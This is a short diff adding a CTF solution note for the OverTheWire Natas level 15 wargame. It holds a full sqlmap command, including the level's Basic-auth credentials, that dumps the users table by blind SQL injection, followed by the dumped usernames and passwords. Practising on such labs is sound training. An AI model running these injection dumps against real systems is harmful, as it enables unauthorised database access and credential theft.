@@ -1,0 +1,14 @@
+# SqlMap
+sqlmap -u "http://natas15.natas.labs.overthewire.org/index.php" --dbms=mysql --threads=10 -o --auth-type=Basic --auth-cred=natas15:SdqIqBsFcz3yotlNYErZSZwblkm0lrvx --data "username=natas16" --string="This user exists" --level=5 --risk=3 -D natas15 -T users -C 'username, password' --dump --batch 
+
+Database: natas15
+Table: users
+[4 entries]
++----------+----------------------------------+
+| username | password                         |
++----------+----------------------------------+
+| bob      | 6P151OntQe                       |
+| charlie  | HLwuGKts2w                       |
+| natas16  | hPkjKYviLQctEW33QmuXL6eDVfMW4sGo |
+| alice    | hROtsfM734                       |
++----------+----------------------------------+
